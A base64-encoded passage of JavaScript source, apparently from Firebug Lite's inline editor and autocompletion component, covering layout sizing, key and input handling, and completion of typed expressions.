LmV4cGFuZGVyKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICh0aGlzLmJveC5wYXJlbnROb2RlKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLy9zZXRTZWxlY3Rpb25SYW5nZSh0aGlzLmlucHV0LCAwLCAwKTsNCiAgICAgICAgICAgIHRoaXMuaW5wdXQuYmx1cigpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aGlzLmJveC5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMuYm94KTsNCiAgICAgICAgfQ0KDQogICAgICAgIGRlbGV0ZSB0aGlzLnRhcmdldDsNCiAgICAgICAgZGVsZXRlIHRoaXMucGFuZWw7DQogICAgfSwNCg0KICAgIGxheW91dDogZnVuY3Rpb24oZm9yY2VBbGwpDQogICAgew0KICAgICAgICBpZiAoIXRoaXMuZml4ZWRXaWR0aCkNCiAgICAgICAgICAgIHRoaXMudGV4dFNpemUgPSB0aGlzLm1lYXN1cmVJbnB1dFRleHQodGhpcy5pbnB1dC52YWx1ZSk7DQoNCiAgICAgICAgaWYgKGZvcmNlQWxsKQ0KICAgICAgICAgICAgdGhpcy50YXJnZXRPZmZzZXQgPSBnZXRDbGllbnRPZmZzZXQodGhpcy5leHBhbmRlcik7DQoNCiAgICAgICAgdGhpcy51cGRhdGVMYXlvdXQoZmFsc2UsIGZvcmNlQWxsKTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGJlZ2luRWRpdGluZzogZnVuY3Rpb24odGFyZ2V0LCB2YWx1ZSkNCiAgICB7DQogICAgfSwNCg0KICAgIHNhdmVFZGl0OiBmdW5jdGlvbih0YXJnZXQsIHZhbHVlLCBwcmV2aW91c1ZhbHVlKQ0KICAgIHsNCiAgICB9LA0KDQogICAgZW5kRWRpdGluZzogZnVuY3Rpb24odGFyZ2V0LCB2YWx1ZSwgY2FuY2VsKQ0KICAgIHsNCiAgICAgICAgLy8gUmVtb3ZlIGVtcHR5IGdyb3VwcyBieSBkZWZhdWx0DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBpbnNlcnROZXdSb3c6IGZ1bmN0aW9uKHRhcmdldCwgaW5zZXJ0V2hlcmUpDQogICAgew0KICAgIH0sDQoNCiAgICBhZHZhbmNlVG9OZXh0OiBmdW5jdGlvbih0YXJnZXQsIGNoYXJDb2RlKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgZ2V0QXV0b0NvbXBsZXRlUmFuZ2U6IGZ1bmN0aW9uKHZhbHVlLCBvZmZzZXQpDQogICAgew0KICAgIH0sDQoNCiAgICBnZXRBdXRvQ29tcGxldGVMaXN0OiBmdW5jdGlvbihwcmVFeHByLCBleHByLCBwb3N0RXhwcikNCiAgICB7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGdldEF1dG9Db21wbGV0ZXI6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIGlmICghdGhpcy5hdXRvQ29tcGxldGVyKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLmF1dG9Db21wbGV0ZXIgPSBuZXcgRmlyZWJ1Zy5BdXRvQ29tcGxldGVyKG51bGwsDQogICAgICAgICAgICAgICAgYmluZCh0aGlzLmdldEF1dG9Db21wbGV0ZVJhbmdlLCB0aGlzKSwgYmluZCh0aGlzLmdldEF1dG9Db21wbGV0ZUxpc3QsIHRoaXMpLA0KICAgICAgICAgICAgICAgIHRydWUsIGZhbHNlKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiB0aGlzLmF1dG9Db21wbGV0ZXI7DQogICAgfSwNCg0KICAgIGNvbXBsZXRlVmFsdWU6IGZ1bmN0aW9uKGFtdCkNCiAgICB7DQogICAgICAgIC8vY29uc29sZS5sb2coImNvbXBsZXRlVmFsdWUiKTsNCiAgICAgICAgDQogICAgICAgIHZhciBzZWxlY3RSYW5nZUNhbGxiYWNrID0gdGhpcy5nZXRBdXRvQ29tcGxldGVyKCkuY29tcGxldGUoY3VycmVudFBhbmVsLmNvbnRleHQsIHRoaXMuaW5wdXQsIHRydWUsIGFtdCA8IDApOyANCiAgICAgICAgDQogICAgICAgIGlmIChzZWxlY3RSYW5nZUNhbGxiYWNrKQ0KICAgICAgICB7DQogICAgICAgICAgICBGaXJlYnVnLkVkaXRvci51cGRhdGUodHJ1ZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFdlIG5lZWQgdG8gc2VsZWN0IHRoZSBlZGl0b3IgdGV4dCBhZnRlciBjYWxsaW5nIHVwZGF0ZSBpbiBTYWZhcmkvQ2hyb21lLA0KICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHRoZSB0ZXh0IHdvbid0IGJlIHNlbGVjdGVkDQogICAgICAgICAgICBpZiAoaXNTYWZhcmkpDQogICAgICAgICAgICAgICAgc2V0VGltZW91dChzZWxlY3RSYW5nZUNhbGxiYWNrLDApOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHNlbGVjdFJhbmdlQ2FsbGJhY2soKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICB0aGlzLmluY3JlbWVudFZhbHVlKGFtdCk7DQogICAgfSwNCg0KICAgIGluY3JlbWVudFZhbHVlOiBmdW5jdGlvbihhbXQpDQogICAgew0KICAgICAgICB2YXIgdmFsdWUgPSB0aGlzLmlucHV0LnZhbHVlOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gZWRpdG9yDQogICAgICAgIGlmIChpc0lFKQ0KICAgICAgICAgICAgdmFyIHN0YXJ0ID0gZ2V0SW5wdXRTZWxlY3Rpb25TdGFydCh0aGlzLmlucHV0KSwgZW5kID0gc3RhcnQ7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHZhciBzdGFydCA9IHRoaXMuaW5wdXQuc2VsZWN0aW9uU3RhcnQsIGVuZCA9IHRoaXMuaW5wdXQuc2VsZWN0aW9uRW5kOw0KDQogICAgICAgIC8vZGVidWdnZXI7DQogICAgICAgIHZhciByYW5nZSA9IHRoaXMuZ2V0QXV0b0NvbXBsZXRlUmFuZ2UodmFsdWUsIHN0YXJ0KTsNCiAgICAgICAgaWYgKCFyYW5nZSB8fCByYW5nZS50eXBlICE9ICJpbnQiKQ0KICAgICAgICAgICAgcmFuZ2UgPSB7c3RhcnQ6IDAsIGVuZDogdmFsdWUubGVuZ3RoLTF9Ow0KDQogICAgICAgIHZhciBleHByID0gdmFsdWUuc3Vic3RyKHJhbmdlLnN0YXJ0LCByYW5nZS5lbmQtcmFuZ2Uuc3RhcnQrMSk7DQogICAgICAgIHByZUV4cHIgPSB2YWx1ZS5zdWJzdHIoMCwgcmFuZ2Uuc3RhcnQpOw0KICAgICAgICBwb3N0RXhwciA9IHZhbHVlLnN1YnN0cihyYW5nZS5lbmQrMSk7DQoNCiAgICAgICAgLy8gU2VlIGlmIHRoZSB2YWx1ZSBpcyBhbiBpbnRlZ2VyLCBhbmQgaWYgc28gaW5jcmVtZW50IGl0DQogICAgICAgIHZhciBpbnRWYWx1ZSA9IHBhcnNlSW50KGV4cHIpOw0KICAgICAgICBpZiAoISFpbnRWYWx1ZSB8fCBpbnRWYWx1ZSA9PSAwKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbSA9IC9cZCsvLmV4ZWMoZXhwcik7DQogICAgICAgICAgICB2YXIgZGlnaXRQb3N0ID0gZXhwci5zdWJzdHIobS5pbmRleCttWzBdLmxlbmd0aCk7DQoNCiAgICAgICAgICAgIHZhciBjb21wbGV0aW9uID0gaW50VmFsdWUtYW10Ow0KICAgICAgICAgICAgdGhpcy5pbnB1dC52YWx1ZSA9IHByZUV4cHIgKyBjb21wbGV0aW9uICsgZGlnaXRQb3N0ICsgcG9zdEV4cHI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHNldFNlbGVjdGlvblJhbmdlKHRoaXMuaW5wdXQsIHN0YXJ0LCBlbmQpOw0KDQogICAgICAgICAgICBGaXJlYnVnLkVkaXRvci51cGRhdGUodHJ1ZSk7DQoNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgb25LZXlQcmVzczogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICAvL2NvbnNvbGUubG9nKCJvbktleVByZXNzIiwgZXZlbnQpOw0KICAgICAgICBpZiAoZXZlbnQua2V5Q29kZSA9PSAyNyAmJiAhdGhpcy5jb21wbGV0ZUFzWW91VHlwZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJldmVydGVkID0gdGhpcy5nZXRBdXRvQ29tcGxldGVyKCkucmV2ZXJ0KHRoaXMuaW5wdXQpOw0KICAgICAgICAgICAgaWYgKHJldmVydGVkKQ0KICAgICAgICAgICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50KTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChldmVudC5jaGFyQ29kZSAmJiB0aGlzLmFkdmFuY2VUb05leHQodGhpcy50YXJnZXQsIGV2ZW50LmNoYXJDb2RlKSkNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Zy5FZGl0b3IudGFiTmV4dEVkaXRvcigpOw0KICAgICAgICAgICAgY2FuY2VsRXZlbnQoZXZlbnQpOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKHRoaXMubnVtZXJpYyAmJiBldmVudC5jaGFyQ29kZSAmJiAoZXZlbnQuY2hhckNvZGUgPCA0OCB8fCBldmVudC5jaGFyQ29kZSA+IDU3KQ0KICAgICAgICAgICAgICAgICYmIGV2ZW50LmNoYXJDb2RlICE9IDQ1ICYmIGV2ZW50LmNoYXJDb2RlICE9IDQ2KQ0KICAgICAgICAgICAgICAgIEZCTC5jYW5jZWxFdmVudChldmVudCk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gSWYgdGhlIHVzZXIgYmFja3NwYWNlcywgZG9uJ3QgYXV0b2NvbXBsZXRlIGFmdGVyIHRoZSB1cGNvbWluZyBpbnB1dCBldmVudA0KICAgICAgICAgICAgICAgIHRoaXMuaWdub3JlTmV4dElucHV0ID0gZXZlbnQua2V5Q29kZSA9PSA4Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSwNCg0KICAgIG9uT3ZlcmZsb3c6IGZ1bmN0aW9uKCkNCiAgICB7DQogICAgICAgIHRoaXMudXBkYXRlTGF5b3V0KGZhbHNlLCBmYWxzZSwgMyk7DQogICAgfSwNCg0KICAgIG9uS2V5RG93bjogZnVuY3Rpb24oZXZlbnQpDQogICAgew0KICAgICAgICAvL2NvbnNvbGUubG9nKCJvbktleURvd24iLCBldmVudC5rZXlDb2RlKTsNCiAgICAgICAgaWYgKGV2ZW50LmtleUNvZGUgPiA0NiB8fCBldmVudC5rZXlDb2RlID09IDMyIHx8IGV2ZW50LmtleUNvZGUgPT0gOCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5rZXlEb3duUHJlc3NlZCA9IHRydWU7DQogICAgICAgIH0NCiAgICB9LA0KICAgIA0KICAgIG9uSW5wdXQ6IGZ1bmN0aW9uKGV2ZW50KQ0KICAgIHsNCiAgICAgICAgLy9kZWJ1Z2dlcjsNCiAgICAgICAgDQogICAgICAgIC8vIHNraXAgbm90IHJlbGV2YW50IG9ucHJvcGVydHljaGFuZ2UgY2FsbHMgb24gSUUNCiAgICAgICAgaWYgKGlzSUUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmIChldmVudC5wcm9wZXJ0eU5hbWUgIT0gInZhbHVlIiB8fCAhaXNWaXNpYmxlKHRoaXMuaW5wdXQpIHx8ICF0aGlzLmtleURvd25QcmVzc2VkKSANCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIHRoaXMua2V5RG93blByZXNzZWQgPSBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy9jb25zb2xlLmxvZygib25JbnB1dCIsIGV2ZW50KTsNCiAgICAgICAgLy9jb25zb2xlLnRyYWNlKCk7DQogICAgICAgIA0KICAgICAgICB2YXIgc2VsZWN0UmFuZ2VDYWxsYmFjazsNCiAgICAgICAgDQogICAgICAgIGlmICh0aGlzLmlnbm9yZU5leHRJbnB1dCkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5pZ25vcmVOZXh0SW5wdXQgPSBmYWxzZTsNCiAgICAgICAgICAgIHRoaXMuZ2V0QXV0b0NvbXBsZXRlcigpLnJlc2V0KCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSBpZiAodGhpcy5jb21wbGV0ZUFzWW91VHlwZSkNCiAgICAgICAgICAgIHNlbGVjdFJhbmdlQ2FsbGJhY2sgPSB0aGlzLmdldEF1dG9Db21wbGV0ZXIoKS5jb21wbGV0ZShjdXJyZW50UGFuZWwuY29udGV4dCwgdGhpcy5pbnB1dCwgZmFsc2UpOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICB0aGlzLmdldEF1dG9Db21wbGV0ZXIoKS5yZXNldCgpOw0KDQogICAgICAgIEZpcmVidWcuRWRpdG9yLnVwZGF0ZSgpOw0KICAgICAgICANCiAgICAgICAgaWYgKHNlbGVjdFJhbmdlQ2FsbGJhY2spDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIFdlIG5lZWQgdG8gc2VsZWN0IHRoZSBlZGl0b3IgdGV4dCBhZnRlciBjYWxsaW5nIHVwZGF0ZSBpbiBTYWZhcmkvQ2hyb21lLA0KICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHRoZSB0ZXh0IHdvbid0IGJlIHNlbGVjdGVkDQogICAgICAgICAgICBpZiAoaXNTYWZhcmkpDQogICAgICAgICAgICAgICAgc2V0VGltZW91dChzZWxlY3RSYW5nZUNhbGxiYWNrLDApOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHNlbGVjdFJhbmdlQ2FsbGJhY2soKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBvbkNvbnRleHRNZW51OiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50KTsNCg0KICAgICAgICB2YXIgcG9wdXAgPSAkKCJmYklubGluZUVkaXRvclBvcHVwIik7DQogICAgICAgIEZCTC5lcmFzZU5vZGUocG9wdXApOw0KDQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgdmFyIG1lbnUgPSB0aGlzLmdldENvbnRleHRNZW51SXRlbXModGFyZ2V0KTsNCiAgICAgICAgaWYgKG1lbnUpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbWVudS5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICAgICBGQkwuY3JlYXRlTWVudUl0ZW0ocG9wdXAsIG1lbnVbaV0pOw0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKCFwb3B1cC5maXJzdENoaWxkKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIHBvcHVwLm9wZW5Qb3B1cEF0U2NyZWVuKGV2ZW50LnNjcmVlblgsIGV2ZW50LnNjcmVlblksIHRydWUpOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgdXBkYXRlTGF5b3V0OiBmdW5jdGlvbihpbml0aWFsLCBmb3JjZUFsbCwgZXh0cmFXaWR0aCkNCiAgICB7DQogICAgICAgIGlmICh0aGlzLmZpeGVkV2lkdGgpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuYm94LnN0eWxlLmxlZnQgPSAodGhpcy50YXJnZXRPZmZzZXQueCkgKyAicHgiOw0KICAgICAgICAgICAgdGhpcy5ib3guc3R5bGUudG9wID0gKHRoaXMudGFyZ2V0T2Zmc2V0LnkpICsgInB4IjsNCg0KICAgICAgICAgICAgdmFyIHcgPSB0aGlzLnRhcmdldC5vZmZzZXRXaWR0aDsNCiAgICAgICAgICAgIHZhciBoID0gdGhpcy50YXJnZXQub2Zmc2V0SGVpZ2h0Ow0KICAgICAgICAgICAgdGhpcy5pbnB1dC5zdHlsZS53aWR0aCA9IHcgKyAicHgiOw0KICAgICAgICAgICAgdGhpcy5pbnB1dC5zdHlsZS5oZWlnaHQgPSAoaC0zKSArICJweCI7DQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoaW5pdGlhbCB8fCBmb3JjZUFsbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLmJveC5zdHlsZS5sZWZ0ID0gdGhpcy50YXJnZXRPZmZzZXQueCArICJweCI7DQogICAgICAgICAgICAgICAgdGhpcy5ib3guc3R5bGUudG9wID0gdGhpcy50YXJnZXRPZmZzZXQueSArICJweCI7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHZhciBhcHByb3hUZXh0V2lkdGggPSB0aGlzLnRleHRTaXplLndpZHRoOw0KICAgICAgICAgICAgdmFyIG1heFdpZHRoID0gKGN1cnJlbnRQYW5lbC5wYW5lbE5vZGUuc2Nyb2xsV2lkdGggLSB0aGlzLnRhcmdldE9mZnNldC54KQ0KICAgICAgICAgICAgICAgIC0gdGhpcy5vdXRlck1hcmdpbjsNCg0KICAgICAgICAgICAgdmFyIHdyYXBwZWQgPSBpbml0aWFsDQogICAgICAgICAgICAgICAgPyB0aGlzLm5vV3JhcCAmJiB0aGlzLnRhcmdldFNpemUuaGVpZ2h0ID4gdGhpcy50ZXh0U2l6ZS5oZWlnaHQrMw0KICAgICAgICAgICAgICAgIDogdGhpcy5ub1dyYXAgJiYgYXBwcm94VGV4dFdpZHRoID4gbWF4V2lkdGg7DQoNCiAgICAgICAgICAgIGlmICh3cmFwcGVkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBzdHlsZSA9IGlzSUUgPw0KICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy50YXJnZXQuY3VycmVudFN0eWxlIDoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMudGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZSh0aGlzLnRhcmdldCwgIiIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRhcmdldE1hcmdpbiA9IHBhcnNlSW50KHN0eWxlLm1hcmdpbkxlZnQpICsgcGFyc2VJbnQoc3R5bGUubWFyZ2luUmlnaHQpOw0KDQogICAgICAgICAgICAgICAgLy8gTWFrZSB0aGUgd2lkdGggZml0IHRoZSByZW1haW5pbmcgeC1zcGFjZSBmcm9tIHRoZSBvZmZzZXQgdG8gdGhlIGZhciByaWdodA0KICAgICAgICAgICAgICAgIGFwcHJveFRleHRXaWR0aCA9IG1heFdpZHRoIC0gdGFyZ2V0TWFyZ2luOw0KDQogICAgICAgICAgICAgICAgdGhpcy5pbnB1dC5zdHlsZS53aWR0aCA9ICIxMDAlIjsNCiAgICAgICAgICAgICAgICB0aGlzLmJveC5zdHlsZS53aWR0aCA9IGFwcHJveFRleHRXaWR0aCArICJweCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gTWFrZSB0aGUgaW5wdXQgb25lIGNoYXJhY3RlciB3aWRlciB0aGFuIHRoZSB0ZXh0IHZhbHVlIHNvIHRoYXQNCiAgICAgICAgICAgICAgICAvLyB0eXBpbmcgZG9lcyBub3QgZXZlciBjYXVzZSB0aGUgdGV4dGJveCB0byBzY3JvbGwNCiAgICAgICAgICAgICAgICB2YXIgY2hhcldpZHRoID0gdGhpcy5tZWFzdXJlSW5wdXRUZXh0KCdtJykud2lkdGg7DQoNCiAgICAgICAgICAgICAgICAvLyBTb21ldGltZXMgd2UgbmVlZCB0byBtYWtlIHRoZSBlZGl0b3IgYSBsaXR0bGUgd2lkZXIsIHNwZWNpZmljYWxseSB3aGVuDQogICAgICAgICAgICAgICAgLy8gYW4gb3ZlcmZsb3cgaGFwcGVucywgb3RoZXJ3aXNlIGl0IHdpbGwgc2Nyb2xsIG9mZiBzb21lIHRleHQgb24gdGhlIGxlZnQNCiAgICAgICAgICAgICAgICBpZiAoZXh0cmFXaWR0aCkNCiAgICAgICAgICAgICAgICAgICAgY2hhcldpZHRoICo9IGV4dHJhV2lkdGg7DQoNCiAgICAgICAgICAgICAgICB2YXIgaW5wdXRXaWR0aCA9IGFwcHJveFRleHRXaWR0aCArIGNoYXJXaWR0aDsNCg0KICAgICAgICAgICAgICAgIGlmIChpbml0aWFsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzSUUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvDQogICAgICAgICAgICAgICAgICAgICAgICB2YXIgeERpZmYgPSAxMzsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuYm94LnN0eWxlLndpZHRoID0gKGlucHV0V2lkdGggKyB4RGlmZikgKyAicHgiOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuYm94LnN0eWxlLndpZHRoID0gImF1dG8iOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybw0KICAgICAgICAgICAgICAgICAgICB2YXIgeERpZmYgPSBpc0lFID8gMTM6IHRoaXMuYm94LnNjcm9sbFdpZHRoIC0gdGhpcy5pbnB1dC5vZmZzZXRXaWR0aDsNCiAgICAgICAgICAgICAgICAgICAgdGhpcy5ib3guc3R5bGUud2lkdGggPSAoaW5wdXRXaWR0aCArIHhEaWZmKSArICJweCI7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgdGhpcy5pbnB1dC5zdHlsZS53aWR0aCA9IGlucHV0V2lkdGggKyAicHgiOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0aGlzLmV4cGFuZGVyLnN0eWxlLndpZHRoID0gYXBwcm94VGV4dFdpZHRoICsgInB4IjsNCiAgICAgICAgICAgIHRoaXMuZXhwYW5kZXIuc3R5bGUuaGVpZ2h0ID0gTWF0aC5tYXgodGhpcy50ZXh0U2l6ZS5oZWlnaHQtMywwKSArICJweCI7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoZm9yY2VBbGwpDQogICAgICAgICAgICBzY3JvbGxJbnRvQ2VudGVyVmlldyh0aGlzLmJveCwgbnVsbCwgdHJ1ZSk7DQogICAgfQ0KfSk7DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gQXV0b2NvbXBsZXRpb24NCg0KRmlyZWJ1Zy5BdXRvQ29tcGxldGVyID0gZnVuY3Rpb24oZ2V0RXhwck9mZnNldCwgZ2V0UmFuZ2UsIGV2YWx1YXRvciwgc2VsZWN0TW9kZSwgY2FzZVNlbnNpdGl2ZSkNCnsNCiAgICB2YXIgY2FuZGlkYXRlcyA9IG51bGw7DQogICAgdmFyIG9yaWdpbmFsVmFsdWUgPSBudWxsOw0KICAgIHZhciBvcmlnaW5hbE9mZnNldCA9IC0xOw0KICAgIHZhciBsYXN0RXhwciA9IG51bGw7DQogICAgdmFyIGxhc3RPZmZzZXQgPSAtMTsNCiAgICB2YXIgZXhwck9mZnNldCA9IDA7DQogICAgdmFyIGxhc3RJbmRleCA9IDA7DQogICAgdmFyIHByZVBhcnNlZCA9IG51bGw7DQogICAgdmFyIHByZUV4cHIgPSBudWxsOw0KICAgIHZhciBwb3N0RXhwciA9IG51bGw7DQoNCiAgICB0aGlzLnJldmVydCA9IGZ1bmN0aW9uKHRleHRCb3gpDQogICAgew0KICAgICAgICBpZiAob3JpZ2luYWxPZmZzZXQgIT0gLTEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRleHRCb3gudmFsdWUgPSBvcmlnaW5hbFZhbHVlOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBzZXRTZWxlY3Rpb25SYW5nZSh0ZXh0Qm94LCBvcmlnaW5hbE9mZnNldCwgb3JpZ2luYWxPZmZzZXQpOw0KDQogICAgICAgICAgICB0aGlzLnJlc2V0KCk7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMucmVzZXQoKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH07DQoNCiAgICB0aGlzLnJlc2V0ID0gZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgY2FuZGlkYXRlcyA9IG51bGw7DQogICAgICAgIG9yaWdpbmFsVmFsdWUgPSBudWxsOw0KICAgICAgICBvcmlnaW5hbE9mZnNldCA9IC0xOw0KICAgICAgICBsYXN0RXhwciA9IG51bGw7DQogICAgICAgIGxhc3RPZmZzZXQgPSAwOw0KICAgICAgICBleHByT2Zmc2V0ID0gMDsNCiAgICB9Ow0KDQogICAgdGhpcy5jb21wbGV0ZSA9IGZ1bmN0aW9uKGNvbnRleHQsIHRleHRCb3gsIGN5Y2xlLCByZXZlcnNlKQ0KICAgIHsNCiAgICAgICAgLy9jb25zb2xlLmxvZygiY29tcGxldGUiLCBjb250ZXh0LCB0ZXh0Qm94LCBjeWNsZSwgcmV2ZXJzZSk7DQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIGltcG9ydGFudCBwb3J0IHRvIGZpcmVidWcgKHZhcmlhYmxlIGxlYWspDQogICAgICAgIC8vdmFyIHZhbHVlID0gbGFzdFZhbHVlID0gdGV4dEJveC52YWx1ZTsNCiAgICAgICAgdmFyIHZhbHVlID0gdGV4dEJveC52YWx1ZTsNCiAgICAgICAgDQogICAgICAgIC8vdmFyIG9mZnNldCA9IHRleHRCb3guc2VsZWN0aW9uU3RhcnQ7DQogICAgICAgIHZhciBvZmZzZXQgPSBnZXRJbnB1dFNlbGVjdGlvblN0YXJ0KHRleHRCb3gpOw0KICAgICAgICANCiAgICAgICAgLy8gVGhlIHJlc3VsdCBvZiBzZWxlY3Rpb25TdGFydCgpIGluIFNhZmFyaS9DaHJvbWUgaXMgMSB1bml0IGxlc3MgdGhhbiB0aGUgcmVzdWx0DQogICAgICAgIC8vIGluIEZpcmVmb3guIFRoZXJlZm9yZSwgd2UgbmVlZCB0byBtYW51YWxseSBhZGp1c3QgdGhlIHZhbHVlIGhlcmUuDQogICAgICAgIGlmIChpc1NhZmFyaSAmJiAhY3ljbGUgJiYgb2Zmc2V0ID49IDApIG9mZnNldCsrOw0KICAgICAgICANCiAgICAgICAgaWYgKCFzZWxlY3RNb2RlICYmIG9yaWdpbmFsT2Zmc2V0ICE9IC0xKQ0KICAgICAgICAgICAgb2Zmc2V0ID0gb3JpZ2luYWxPZmZzZXQ7DQoNCiAgICAgICAgaWYgKCFjYW5kaWRhdGVzIHx8ICFjeWNsZSB8fCBvZmZzZXQgIT0gbGFzdE9mZnNldCkNCiAgICAgICAgew0KICAgICAgICAgICAgb3JpZ2luYWxPZmZzZXQgPSBvZmZzZXQ7DQogICAgICAgICAgICBvcmlnaW5hbFZhbHVlID0gdmFsdWU7DQoNCiAgICAgICAgICAgIC8vIEZpbmQgdGhlIHBhcnQgb2YgdGhlIHN0cmluZyB0aGF0IHdpbGwgYmUgcGFyc2VkDQogICAgICAgICAgICB2YXIgcGFyc2VTdGFydCA9IGdldEV4cHJPZmZzZXQgPyBnZXRFeHByT2Zmc2V0KHZhbHVlLCBvZmZzZXQsIGNvbnRleHQpIDogMDsNCiAgICAgICAgICAgIHByZVBhcnNlZCA9IHZhbHVlLnN1YnN0cigwLCBwYXJzZVN0YXJ0KTsNCiAgICAgICAgICAgIHZhciBwYXJzZWQgPSB2YWx1ZS5zdWJzdHIocGFyc2VTdG